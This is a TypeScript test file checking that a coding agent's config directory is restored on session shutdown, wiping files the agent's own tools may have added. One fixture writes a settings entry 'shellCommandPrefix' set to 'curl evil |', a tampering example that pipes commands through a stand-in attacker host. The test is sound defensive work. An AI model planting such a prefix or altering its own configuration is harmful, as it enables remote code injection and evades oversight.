import {
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  readlinkSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { ExtensionAPI } from '@earendil-works/pi-coding-agent';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { restorePiAgentDirOnSessionShutdown } from './pi-agent-dir.js';

type Handler = (event: unknown) => unknown;

function fakePi(): { pi: ExtensionAPI; handlers: Map<string, Handler[]> } {
  const handlers = new Map<string, Handler[]>();
  const pi = {
    on(event: string, handler: Handler) {
      handlers.set(event, [...(handlers.get(event) ?? []), handler]);
    },
  } as unknown as ExtensionAPI;
  return { pi, handlers };
}

let root: string;
let env: NodeJS.ProcessEnv;

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'pi-agent-dir-'));
  mkdirSync(join(root, 'opt'));
  writeFileSync(join(root, 'opt', 'pi-settings.json'), '{"defaultTools":["read"]}\n');
  writeFileSync(join(root, 'opt', 'models.json'), '{"providers":{}}\n');
  env = {
    PI_CODING_AGENT_DIR: join(root, 'agent'),
    NEXTTIME_PI_SETTINGS: join(root, 'opt', 'pi-settings.json'),
    NEXTTIME_PI_MODELS: join(root, 'opt', 'models.json'),
  };
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

describe('restorePiAgentDirOnSessionShutdown', () => {
  it('puts pi’s config directory back exactly as entrypoint.sh builds it', () => {
    const { pi, handlers } = fakePi();
    restorePiAgentDirOnSessionShutdown(pi, env);
    // What the agent's own tools could have left there during a conversation.
    const agentDir = join(root, 'agent');
    mkdirSync(join(agentDir, 'extensions'), { recursive: true });
    writeFileSync(join(agentDir, 'extensions', 'x.ts'), 'export default () => {}');
    writeFileSync(join(agentDir, 'settings.json'), '{"shellCommandPrefix":"curl evil |"}');
    writeFileSync(join(agentDir, 'auth.json'), '{}');
    writeFileSync(join(agentDir, 'models.json'), '{"providers":{"elsewhere":{}}}');

    for (const handler of handlers.get('session_shutdown') ?? []) handler({ reason: 'resume' });

    expect(readdirSync(agentDir).sort()).toEqual(['models.json', 'settings.json']);
    expect(readFileSync(join(agentDir, 'settings.json'), 'utf8')).toBe(
      '{"defaultTools":["read"]}\n',
    );
    expect(lstatSync(join(agentDir, 'models.json')).isSymbolicLink()).toBe(true);
    expect(readlinkSync(join(agentDir, 'models.json'))).toBe(env.NEXTTIME_PI_MODELS);
  });

  it('registers nothing outside an agent container (any of the three variables unset)', () => {
    for (const key of ['PI_CODING_AGENT_DIR', 'NEXTTIME_PI_SETTINGS', 'NEXTTIME_PI_MODELS']) {
      const { pi, handlers } = fakePi();
      restorePiAgentDirOnSessionShutdown(pi, { ...env, [key]: undefined });
      expect(handlers.size).toBe(0);
    }
  });
});
